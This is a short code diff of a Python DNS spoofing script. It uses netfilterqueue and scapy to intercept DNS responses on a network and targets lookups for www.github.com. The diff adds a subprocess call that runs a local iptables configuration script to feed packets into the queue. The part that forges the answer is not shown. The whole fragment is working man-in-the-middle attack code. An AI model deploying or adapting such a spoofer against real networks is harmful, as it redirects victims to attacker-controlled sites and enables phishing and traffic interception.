@@ -2,13 +2,15 @@
 
 import netfilterqueue
 import scapy.all as scapy
+import subprocess
+
 
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         # print(scapy_packet.show())
-        
+
         q_name = scapy_packet[scapy.DNSQR].qname
         if "www.github.com" in q_name:
             print("[+] Spoofing target ")
@@ -25,6 +27,8 @@ def process_packet(packet):
 
     packet.accept()
 
+
+subprocess.call(['sh', './iptables_config.sh'])
 
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
